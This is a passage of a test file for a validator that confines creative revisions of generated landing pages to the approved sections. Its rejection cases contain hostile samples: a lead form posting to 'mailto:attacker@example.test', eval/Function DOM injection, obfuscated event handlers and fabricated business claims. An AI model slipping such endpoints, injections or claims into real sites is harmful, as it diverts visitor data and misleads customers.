import { afterEach, describe, expect, it, vi } from "vitest";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import {
  findUnsafeJsxBehavior,
  findUnsupportedClaimCopy,
} from "../scripts/creative-revision-scope.mjs";
import * as repairModule from "../scripts/run-rendered-creative-repair.mjs";
import { validateProductionCandidateFiles } from "../scripts/production-experience-author.mjs";

const api = repairModule as any;
const roots: string[] = [];

afterEach(async () => {
  vi.unstubAllGlobals();
  await Promise.all(
    roots
      .splice(0)
      .map((root) => fs.rm(root, { recursive: true, force: true })),
  );
});

const experience = `export default function Experience({ content }) {
  return <main>
    <section data-reference-section="hero" data-hero><h1>{content.hero.heading}</h1><a href="#contact" data-early-conversion>{content.hero.primaryLabel}</a></section>
    <section id="services" data-reference-section="services" data-service-presentation="rows"><h2>Original services</h2></section>
    <section id="faqs" data-reference-section="faqs"><h2>Original questions</h2></section>
    <section id="contact" data-reference-section="contact"><h2>Contact</h2></section>
  </main>;
}`;

const scope = {
  version: 1,
  sectionIds: ["hero"],
  allowMotion: false,
};

const productionExperience = `import { LeadForm } from "@launchloom/runtime";
export default function Experience({ content }) {
  return <main>
    <nav><a href="#services">Services</a><a href="#faqs">FAQs</a><a href="#contact">Contact</a></nav>
    <section data-reference-section="hero" data-hero><h1>{content.hero.heading}</h1><a href="#contact" data-early-conversion>{content.hero.primaryLabel}</a></section>
    <section id="services" data-reference-section="services" data-service-presentation="rows">{content.services}</section>
    <section id="faqs" data-reference-section="faqs">{content.faqs}</section>
    <section id="contact" data-reference-section="contact"><LeadForm content={content} /></section>
  </main>;
}`;
const productionContent = {
  brand: { phone: "+1-555-0100", email: "hello@example.test" },
};
const productionFiles = (
  experienceSource = productionExperience,
  motion = "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
) => ({
  experience: experienceSource,
  styles: ".candidate { color: #111; }",
  motion,
});

function resolveHeroScope(
  source: string,
  feedback = "Improve the hero layout.",
) {
  return api.resolveCreativeRevisionScope({
    source,
    feedbackItems: [{ feedbackIndex: 0, feedback }],
  });
}

const rejectedRepairs: Array<
  [string, (before: Record<string, string>) => Record<string, string>, RegExp]
> = [
  [
    "unrelated JSX",
    (before: Record<string, string>) => ({
      ...before,
      experience: experience.replace("Original services", "Changed services"),
    }),
    /JSX changed outside declared section scope/iu,
  ],
  [
    "global CSS",
    (before: Record<string, string>) => ({
      ...before,
      styles: before.styles.replace("--ink: #111", "--ink: #222"),
    }),
    /global or unrelated CSS changed/iu,
  ],
  [
    "unapproved motion",
    (before: Record<string, string>) => ({
      ...before,
      motion: before.motion.replace(
        "return () => {}; }",
        "return () => {}; gsap.to(window, { opacity: 1 }); }",
      ),
    }),
    /motion without explicit approval/iu,
  ],
];

function assertScope(
  before: Record<string, string>,
  after: Record<string, string>,
  declared = scope,
) {
  expect(api.assertCreativeRevisionScope).toBeTypeOf("function");
  return api.assertCreativeRevisionScope(before, after, declared);
}

describe("human creative revision source scope", () => {
  it("handles bare visitor-copy attributes as empty text without throwing", () => {
    expect(
      findUnsupportedClaimCopy(
        '<main><section data-reference-section="hero"><button aria-label /></section></main>',
        ["hero"],
      ),
    ).toEqual([]);
  });

  it("does not treat a data-reference-section marker on a non-section node as a revision target", () => {
    const source = experience.replace(
      '<section data-reference-section="hero" data-hero>',
      '<section data-reference-section="hero" data-hero><div data-reference-section="nested-note">Note</div>',
    );

    expect(resolveHeroScope(source).sectionIds).toEqual(["hero"]);
  });

  it("rejects JSX event handlers that can mutate the page outside the approved section", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        '<a href="#contact" data-early-conversion>',
        '<a href="#contact" data-early-conversion onClick={() => { document.body.innerHTML = ""; }}>',
      ),
    };
    const declared = resolveHeroScope(before.experience);

    expect(() => assertScope(before, after, declared)).toThrow(
      /event handler|executable JSX/iu,
    );
    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-a" },
        content: productionContent,
      }),
    ).toThrow(/event handler|executable JSX/iu);
  });

  it("rejects a scoped repair that adds a raw form endpoint beside the shared lead form", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1>{content.hero.heading}</h1><form action="mailto:attacker@example.test"><button formAction="mailto:override@example.test">Contact</button></form>',
      ),
    };
    const declared = resolveHeroScope(before.experience);

    expect(() => assertScope(before, after, declared)).toThrow(
      /shared LeadForm|unapproved form endpoint|native form/iu,
    );
    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-unsealed-form-endpoint" },
        content: productionContent,
      }),
    ).toThrow(/shared LeadForm|unapproved form endpoint|native form/iu);
  });

  it.each([
    ["lowercase JSX event prop", "onclick={() => {}}"],
    ["lowercase event prop in a static spread", "{...{ onclick: () => {} }}"],
  ])("rejects a %s", (_kind, prop) => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        '<a href="#contact" data-early-conversion>',
        `<a href="#contact" data-early-conversion ${prop}>`,
      ),
    };
    const declared = resolveHeroScope(before.experience);

    expect(() => assertScope(before, after, declared)).toThrow(
      /event handlers and page-wide behavior|executable JSX/iu,
    );

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-lowercase-event" },
        content: productionContent,
      }),
    ).toThrow(/event handler|executable JSX/iu);
  });

  it.each([
    ["callback ref", 'ref={(element) => { element.textContent = "Changed"; }}'],
    [
      "callback ref in a static spread",
      '{...{ ref: (element) => { element.textContent = "Changed"; } }}',
    ],
    ["computed event key", '{...{ ["onClick"]: () => {} }}'],
    ["composed computed event key", '{...{ ["on" + "Click"]: () => {} }}'],
  ])("rejects a %s", (_kind, prop) => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        '<a href="#contact" data-early-conversion>',
        `<a href="#contact" data-early-conversion ${prop}>`,
      ),
    };
    const declared = resolveHeroScope(before.experience);

    expect(() => assertScope(before, after, declared)).toThrow(
      /event handlers and page-wide behavior|executable JSX/iu,
    );

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-ref-or-computed-event" },
        content: productionContent,
      }),
    ).toThrow(/ref|event handler|executable JSX|computed/iu);
  });

  it("rejects page-wide DOM writes during component render", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        "  return <main>",
        '  document.body.innerHTML = "<p>Injected content</p>";\n  return <main>',
      ),
    };

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-render-side-effect" },
        content: productionContent,
      }),
    ).toThrow(/page-wide global|unsafe JSX behavior/iu);
  });

  it("rejects dynamically constructed render-time code", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        "  return <main>",
        '  Function("return document.body")().textContent = "Injected";\n  return <main>',
      ),
    };

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-dynamic-render-code" },
        content: productionContent,
      }),
    ).toThrow(/Function|dynamic code|unsafe JSX behavior/iu);
  });

  it("detects eval inside the approved JSX section expression", () => {
    const source = productionExperience.replace(
      "{content.hero.heading}",
      '{eval("document.body.innerHTML = \\\"Injected\\\"")} ',
    );

    expect(findUnsafeJsxBehavior(source, ["hero"])).toContain(
      "hero:page-wide global eval",
    );
  });

  it("rejects removing a negation that turns existing JSX fragments into a new guarantee", () => {
    const baseline = productionExperience.replace(
      "<h1>{content.hero.heading}</h1>",
      '<h1>{content.hero.heading}</h1><p>{"We "}<b>{"do not "}</b><strong>{"guarantee results"}</strong></p>',
    );
    const before = productionFiles(baseline);
    const after = {
      ...before,
      experience: baseline.replace('<b>{"do not "}</b>', ""),
    };
    const declared = resolveHeroScope(baseline);

    expect(() => assertScope(before, after, declared)).toThrow(
      /claim|factual review|manual attention/iu,
    );
    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-a" },
        content: productionContent,
      }),
    ).toThrow(/unsupported claim|guarantee/iu);
  });

  it("rejects GSAP text mutations in an explicitly approved motion edit", () => {
    const before = productionFiles();
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        gsap.set(hero, { textContent: "Fully licensed and insured, with guaranteed results." });
        return () => {};
      }`,
    };
    const declared = resolveHeroScope(
      before.experience,
      "Improve motion in the hero section.",
    );

    expect(() => assertScope(before, after, declared)).toThrow(
      /textContent|innerHTML|content mutation|visual properties/iu,
    );
    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-a" },
        content: productionContent,
      }),
    ).toThrow(/textContent|innerHTML|content mutation|visual properties/iu);
  });

  it("rejects GSAP text mutations hidden behind a vars alias", () => {
    const before = productionFiles();
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        const vars = { innerHTML: "<p>We guarantee results</p>" };
        gsap.set(hero, vars);
        return () => {};
      }`,
    };
    const declared = resolveHeroScope(
      before.experience,
      "Improve motion in the hero section.",
    );

    expect(() => assertScope(before, after, declared)).toThrow(
      /innerHTML|content mutation|visual properties/iu,
    );
    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-motion-alias" },
        content: productionContent,
      }),
    ).toThrow(/innerHTML|content mutation|visual properties/iu);
  });

  it("rejects GSAP text mutations through a setter alias", () => {
    const before = productionFiles();
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        const setMotion = gsap.set;
        setMotion(hero, { textContent: "Licensed and guaranteed" });
        return () => {};
      }`,
    };

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-motion-set-alias" },
        content: productionContent,
      }),
    ).toThrow(/textContent|content mutation|visual properties/iu);
  });

  it.each([
    ["text property assignment", 'hero.textContent = "Guaranteed results";'],
    ["HTML property assignment", 'hero.innerHTML = "Guaranteed results";'],
    [
      "attribute mutation method",
      'hero.setAttribute("href", "tel:+1-999-9999");',
    ],
    ["appending unsealed copy", 'hero.append("We guarantee results");'],
    [
      "inserting an element",
      'hero.insertAdjacentElement("beforeend", document.createElement("p"));',
    ],
    ["removing a required element", "hero.remove();"],
    ["dataset attribute write", 'hero.dataset.contactUrl = "tel:+1-999-9999";'],
    ["class attribute method", 'hero.classList.add("unverified-claim");'],
    ["style attribute write", 'hero.style.cssText = "display:none";'],
  ])("rejects authored motion with a direct DOM %s", (_kind, mutation) => {
    const before = productionFiles();
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        ${mutation}
        return () => {};
      }`,
    };

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-direct-motion-dom-write" },
        content: productionContent,
      }),
    ).toThrow(/DOM|text|HTML|attribute|href/iu);
  });

  it.each([
    ["telephone", 'href="tel:+1-999-999-9999"'],
    ["email", 'href="mailto:marketing@unverified.example"'],
  ])(
    "rejects an unsealed %s destination inside the requested hero",
    (_kind, href) => {
      const before = productionFiles();
      const after = {
        ...before,
        experience: before.experience.replace(
          'href="#contact" data-early-conversion',
          `${href} data-early-conversion`,
        ),
      };
      const declared = resolveHeroScope(before.experience);

      expect(() => assertScope(before, after, declared)).toThrow(
        /sealed.*(?:phone|email)|(?:phone|email).*sealed|manual attention/iu,
      );
      expect(() =>
        validateProductionCandidateFiles({
          files: after,
          route: { id: "candidate-a" },
          content: productionContent,
        }),
      ).toThrow(/sealed.*(?:phone|email)|(?:phone|email).*sealed/iu);
    },
  );

  it("keeps sealed tel and mailto expressions valid inside an approved section", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        '<a href="#contact" data-early-conversion>{content.hero.primaryLabel}</a></section>',
        "<a href={`tel:${content.brand.phone}`} data-early-conversion>{content.hero.primaryLabel}</a><a href={`mailto:${content.brand.email}`}>{content.brand.email}</a></section>",
      ),
    };
    const declared = resolveHeroScope(before.experience);

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-a" },
        content: productionContent,
      }),
    ).not.toThrow();
    expect(() => assertScope(before, after, declared)).not.toThrow();
  });

  it("allows sealed tel and mailto values in static JSX prop spreads", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        '<a href="#contact" data-early-conversion>{content.hero.primaryLabel}</a>',
        "<a {...{ href: `tel:${content.brand.phone}` }} data-early-conversion>{content.hero.primaryLabel}</a><a {...{ href: `mailto:${content.brand.email}` }}>{content.brand.email}</a>",
      ),
    };

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-sealed-spread-contact" },
        content: productionContent,
      }),
    ).not.toThrow();
  });

  it("persists each creative feedback item with the exact human request text", () => {
    expect(api.createCreativeRepairScopeDeclaration).toBeTypeOf("function");
    expect(
      api.createCreativeRepairScopeDeclaration({
        creativeRenderer: true,
        feedback: ["Improve the hero section.", "Update the business phone."],
        results: [
          {
            feedbackIndex: 0,
            feedback: "Improve the hero section.",
            status: "creative",
            intents: ["layout"],
          },
          {
            feedbackIndex: 1,
            feedback: "Update the business phone.",
            status: "fulfilled",
            intents: ["content"],
          },
        ],
      }),
    ).toEqual({
      required: true,
      feedbackText: "Improve the hero section.\n\nUpdate the business phone.",
      declaration: {
        version: 1,
        requestText: "Improve the hero section.\n\nUpdate the business phone.",
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback: "Improve the hero section.",
          },
        ],
      },
    });
  });

  it("retains creative feedback items that occur after the request-text budget", () => {
    const trailingFeedback = "Please make the hero headline clearer.";
    const result = api.createCreativeRepairScopeDeclaration({
      creativeRenderer: true,
      feedback: [`Context: ${"x".repeat(12_100)}`, trailingFeedback],
      results: [
        {
          feedbackIndex: 1,
          feedback: trailingFeedback,
          status: "creative",
          intents: ["layout"],
        },
      ],
    });

    expect(result.feedbackText).toHaveLength(12_000);
    expect(result.declaration.requestText).toBe(
      `Context: ${"x".repeat(12_100)}\n\n${trailingFeedback}`,
    );
    expect(result.declaration.feedbackItems).toEqual([
      { feedbackIndex: 1, feedback: trailingFeedback },
    ]);
  });

  it("maps a requested main headline adjustment to the hero section only", () => {
    expect(api.resolveCreativeRevisionScope).toBeTypeOf("function");
    expect(
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback: "Make the main headline easier to scan.",
          },
        ],
      }),
    ).toMatchObject({
      sectionIds: ["hero"],
      allowMotion: false,
      feedbackIndexes: [0],
    });
  });

  it("does not treat unrelated child copy as another section's alias", () => {
    const source = experience.replace(
      "Original services",
      "Our hero story appears in this service copy",
    );

    expect(
      api.resolveCreativeRevisionScope({
        source,
        feedbackItems: [
          { feedbackIndex: 0, feedback: "Make the hero headline clearer." },
        ],
      }).sectionIds,
    ).toEqual(["hero"]);
  });

  it("does not inherit aliases from a nested marked section", () => {
    const source = `export default function Experience() {
      return <main>
        <section data-reference-section="chapter-a">
          <section data-reference-section="chapter-b"><LeadForm /></section>
        </section>
      </main>;
    }`;

    expect(
      api.resolveCreativeRevisionScope({
        source,
        feedbackItems: [
          { feedbackIndex: 0, feedback: "Improve the contact form." },
        ],
      }).sectionIds,
    ).toEqual(["chapter-b"]);
  });

  it("rejects changes to an unapproved marked section nested inside an approved section", () => {
    const before = `export default function Experience() {
      return <main>
        <section data-reference-section="hero">
          <h1>Original hero</h1>
          <section data-reference-section="services"><h2>Approved services</h2></section>
        </section>
      </main>;
    }`;
    const after = {
      experience: before.replace("Approved services", "Changed services"),
      styles: "",
      motion: "",
    };

    expect(() =>
      assertScope({ experience: before, styles: "", motion: "" }, after),
    ).toThrow(/outside declared section scope/iu);
  });

  it("allows a requested parent change while preserving its nested marked section", () => {
    const before = `export default function Experience() {
      return <main><section data-reference-section="hero">
        <h1>Original hero</h1>
        <section data-reference-section="services"><h2>Approved services</h2></section>
      </section></main>;
    }`;
    const after = {
      experience: before.replace(
        "<h1>Original hero</h1>",
        '<h1 className="hero-title">Original hero</h1>',
      ),
      styles: "",
      motion: "",
    };

    expect(() =>
      assertScope({ experience: before, styles: "", motion: "" }, after),
    ).not.toThrow();
  });

  it("rejects a tel CTA that rewrites the sealed phone value", () => {
    const before = productionFiles();
    const after = {
      ...before,
      experience: before.experience.replace(
        'href="#contact" data-early-conversion',
        'href={`tel:${content.brand.phone.replace("+1-", "")}-999-9999`} data-early-conversion',
      ),
    };

    expect(() =>
      validateProductionCandidateFiles({
        files: after,
        route: { id: "candidate-rewritten-phone" },
        content: productionContent,
      }),
    ).toThrow(/sealed business content|content.brand.phone/iu);
  });

  it.each([
    ["telephone", 'href: "tel:+1-999-999-9999"'],
    ["email", 'href: "mailto:marketing@unverified.example"'],
  ])(
    "rejects an unsealed %s URL in a static JSX prop spread",
    (_kind, entry) => {
      const before = productionFiles();
      const after = {
        ...before,
        experience: before.experience.replace(
          '<a href="#contact" data-early-conversion>',
          `<a {...{ ${entry} }} data-early-conversion>`,
        ),
      };

      expect(() =>
        validateProductionCandidateFiles({
          files: after,
          route: { id: "candidate-unsealed-spread-contact" },
          content: productionContent,
        }),
      ).toThrow(/sealed business content|content\.brand\.(phone|email)/iu);
    },
  );

  it.each([
    [
      "content.services",
      "{content.services.map((service) => <p>{service.name}</p>)}",
      "Improve the services.",
    ],
    [
      "content.faqs",
      "{content.faqs.map((faq) => <p>{faq.question}</p>)}",
      "Improve the FAQs.",
    ],
    ["FAQList", "<FAQList />", "Improve the FAQs."],
    ["LeadForm", "<LeadForm />", "Improve the contact form."],
    ["SocialProof", "<SocialProof />", "Improve the testimonials."],
  ])("resolves a neutral section through %s", (_signal, child, feedback) => {
    const source = `export default function Experience({ content }) {
      return <main><section data-reference-section="chapter-a">${child}</section></main>;
    }`;

    expect(
      api.resolveCreativeRevisionScope({
        source,
        feedbackItems: [{ feedbackIndex: 0, feedback }],
      }).sectionIds,
    ).toEqual(["chapter-a"]);
  });

  it("does not turn a negated page-wide phrase into permission to edit every section", () => {
    const declaration = api.resolveCreativeRevisionScope({
      source: experience,
      feedbackItems: [
        {
          feedbackIndex: 0,
          feedback: "Do not change the entire page; adjust only the hero.",
        },
      ],
    });

    expect(declaration.sectionIds).toEqual(["hero"]);
  });

  it("does not authorize a section explicitly kept unchanged", () => {
    const declaration = api.resolveCreativeRevisionScope({
      source: experience,
      feedbackItems: [
        {
          feedbackIndex: 0,
          feedback: "Make the hero clearer and keep services unchanged.",
        },
      ],
    });

    expect(declaration.sectionIds).toEqual(["hero"]);
  });

  it("rejects contradictory instructions for the same section", () => {
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback: "Improve services and keep services unchanged.",
          },
        ],
      }),
    ).toThrow(/contradictory|manual attention/iu);
  });

  it("resolves an affirmative site-wide revision to every marked section", () => {
    const declaration = api.resolveCreativeRevisionScope({
      source: experience,
      feedbackItems: [
        {
          feedbackIndex: 0,
          feedback: "Revise the entire page to feel calmer.",
        },
      ],
    });

    expect(declaration.sectionIds).toEqual([
      "hero",
      "services",
      "faqs",
      "contact",
    ]);
  });

  it("fails closed when a negated broad phrase names no actionable section", () => {
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          { feedbackIndex: 0, feedback: "Do not change the entire page." },
        ],
      }),
    ).toThrow(/actionable section targets/iu);
  });

  it("rejects an affirmative site-wide request with an excepted section", () => {
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback: "Revise the entire page except the contact section.",
          },
        ],
      }),
    ).toThrow(/partial site-wide scope is ambiguous/iu);
  });

  it("rejects a site-wide revision that separately excludes a named section", () => {
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback: "Revise the entire page, but leave the hero unchanged.",
          },
        ],
      }),
    ).toThrow(/partial site-wide scope is ambiguous/iu);
  });

  it("rejects a site-wide revision that says not to change a named section", () => {
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback:
              "Revise the whole site; do not change the services section.",
          },
        ],
      }),
    ).toThrow(/partial site-wide scope is ambiguous/iu);
  });

  it("still rejects a section exception after an unrelated negated preference", () => {
    expect(() =>
      api.resolveCreativeRevisionScope({
        source: experience,
        feedbackItems: [
          {
            feedbackIndex: 0,
            feedback:
              "Revise the entire page; do not add parallax; leave the hero unchanged.",
          },
        ],
      }),
    ).toThrow(/partial site-wide scope is ambiguous/iu);
  });

  it("allows a site-wide revision with an unrelated negated preference", () => {
    const declaration = api.resolveCreativeRevisionScope({
      source: experience,
      feedbackItems: [
        {
          feedbackIndex: 0,
          feedback: "Revise the entire page, but do not add parallax motion.",
        },
      ],
    });

    expect(declaration.sectionIds).toEqual([
      "hero",
      "services",
      "faqs",
      "contact",
    ]);
    expect(declaration.allowMotion).toBe(false);
  });

  it("does not authorize motion when the only motion instruction is explicitly negated", () => {
    const declaration = api.resolveCreativeRevisionScope({
      source: experience,
      feedbackItems: [
        {
          feedbackIndex: 0,
          feedback:
            "Make the hero headline larger. Do not change the animation; its transitions are already correct.",
        },
      ],
    });

    expect(declaration).toMatchObject({
      sectionIds: ["hero"],
      allowMotion: false,
    });
  });

  it("authorizes a direct, positive request to adjust a section animation", () => {
    const declaration = api.resolveCreativeRevisionScope({
      source: experience,
      feedbackItems: [
        {
          feedbackIndex: 0,
          feedback: "Make the hero animation smoother and less abrupt.",
        },
      ],
    });

    expect(declaration).toMatchObject({
      sectionIds: ["hero"],
      allowMotion: true,
    });
  });

  it("allows JSX and CSS changes inside the requested section", () => {
    const before = {
      experience,
      styles: `:root { --ink: #111; }
[data-reference-section="hero"] h1 { color: #111; }
[data-reference-section="services"] h2 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1 className="hero-title">{content.hero.heading}</h1>',
      ),
      styles: before.styles.replace("color: #111", "color: #333"),
    };

    expect(after.experience).toContain('className="hero-title"');
    expect(() => assertScope(before, after)).not.toThrow();
  });

  it("does not treat JSX class and style implementation strings as visitor copy", () => {
    const baseline = experience.replace(
      "<h1>{content.hero.heading}</h1>",
      '<h1 className={"layout-original"} style={{ color: "#111", background: "linear-gradient(#111, #222)" }}>{content.hero.heading}</h1>',
    );
    const before = { experience: baseline, styles: "", motion: "" };
    const after = {
      ...before,
      experience: baseline.replace(
        'className={"layout-original"} style={{ color: "#111", background: "linear-gradient(#111, #222)" }}',
        'className={"layout-revised"} style={{ color: "#222", background: "radial-gradient(#333, #444)" }}',
      ),
    };

    expect(() => assertScope(before, after)).not.toThrow();
  });

  it("rejects a new business claim written as JSX text inside an approved section", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        "<h1>{content.hero.heading}</h1><p>Serving families since 1987</p>",
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it("rejects a new business claim written as a JSX string expression", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1>{content.hero.heading}</h1><p>{"Serving families since 1987"}</p>',
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it("rejects a new business claim returned from a JSX expression", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1>{content.hero.heading}</h1><p>{(() => "Serving families since 1987")()}</p>',
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it("rejects a new claim in visitor-facing JSX attributes", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1 aria-label="Serving families since 1987">{content.hero.heading}</h1>',
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it("rejects a new claim hidden in a JSX prop spread", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1 {...{"aria-label": "Serving families since 1987"}}>{content.hero.heading}</h1>',
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it("rejects new visitor-facing claims in scoped CSS pseudo-content", () => {
    const before = {
      experience,
      styles: '[data-reference-section="hero"]::after { content: ""; }',
      motion: "",
    };
    const after = {
      ...before,
      styles: before.styles.replace(
        'content: ""',
        'content: "Serving families since 1987"',
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it.each([
    ["incrementing a DOM property", "hero.scrollTop++;"],
    ["deleting a DOM property", "delete hero.dataset.motionState;"],
  ])(
    "rejects motion edits that mutate a section DOM property by %s",
    (_name, mutation) => {
      const before = {
        experience,
        styles: `[data-reference-section="hero"] h1 { color: #111; }`,
        motion:
          "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
      };
      const after = {
        ...before,
        motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
        ${mutation}
        gsap.to(hero, { opacity: 1, duration: 0.6 });
        return () => {};
      }`,
      };

      expect(() =>
        assertScope(before, after, { ...scope, allowMotion: true }),
      ).toThrow(/motion hooks cannot write directly to scoped DOM elements/iu);
    },
  );

  it("rejects a new claim passed as a visible JSX label prop", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        '<h1>{content.hero.heading}</h1><Promo label="Serving families since 1987" />',
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /visitor-facing copy|manual attention/iu,
    );
  });

  it.each([
    "tagline",
    "caption",
    "eyebrow",
    "subtitle",
    "ariaDescription",
    "buttonText",
    "data-caption",
  ])(
    "rejects new visitor-facing JSX copy passed through the %s prop",
    (prop) => {
      const before = { experience, styles: "", motion: "" };
      const after = {
        ...before,
        experience: experience.replace(
          "<h1>{content.hero.heading}</h1>",
          `<h1>{content.hero.heading}</h1><Promo ${prop}="Serving families since 1987" />`,
        ),
      };

      expect(() => assertScope(before, after)).toThrow(
        /visitor-facing copy|manual attention/iu,
      );
    },
  );

  it("allows existing copy to move within an approved section", () => {
    const before = {
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        "<h1>Trusted care</h1><p>{content.hero.heading}</p>",
      ),
      styles: "",
      motion: "",
    };
    const after = {
      ...before,
      experience: before.experience.replace(
        "<h1>Trusted care</h1><p>{content.hero.heading}</p>",
        "<p>{content.hero.heading}</p><h1>Trusted care</h1>",
      ),
    };

    expect(() => assertScope(before, after)).not.toThrow();
  });

  it("allows fixed UI copy and sealed content bindings in an approved section", () => {
    const before = { experience, styles: "", motion: "" };
    const after = {
      ...before,
      experience: experience.replace(
        "<h1>{content.hero.heading}</h1>",
        "<h1>{content.hero.heading}</h1><button>Open menu</button>",
      ),
    };

    expect(() => assertScope(before, after)).not.toThrow();
  });

  it("rejects JSX changes in an unrelated section", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      experience: experience.replace("Original services", "Changed services"),
    };

    expect(() => assertScope(before, after)).toThrow(
      /outside declared section scope/iu,
    );
  });

  it("rejects shared or unrelated CSS changes", () => {
    const before = {
      experience,
      styles: `:root { --ink: #111; }
[data-reference-section="hero"] h1 { color: #111; }
[data-reference-section="services"] h2 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      styles: before.styles.replace("--ink: #111", "--ink: #222"),
    };

    expect(() => assertScope(before, after)).toThrow(
      /global or unrelated CSS/iu,
    );
  });

  it("rejects motion changes without an explicit motion request", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: before.motion.replace(
        "return () => {}; }",
        "return () => {}; gsap.to(window, { opacity: 1 }); }",
      ),
    };

    expect(() => assertScope(before, after)).toThrow(
      /motion without explicit approval/iu,
    );
  });

  it("rejects an approved motion edit that animates the window instead of the scoped section", () => {
    const before = {
      experience,
      styles: `[data-reference-section="hero"] h1 { color: #111; }`,
      motion:
        "export function mountExperienceMotion(runtime) { if (runtime?.reducedMotion) return () => {}; return () => {}; }",
    };
    const after = {
      ...before,
      motion: `export function mountExperienceMotion(runtime) {
        if (runtime?.reducedMotion) return () => {};
        const hero = document.querySelector('[data-reference-section="hero"]');
        if (!hero) return () => {};
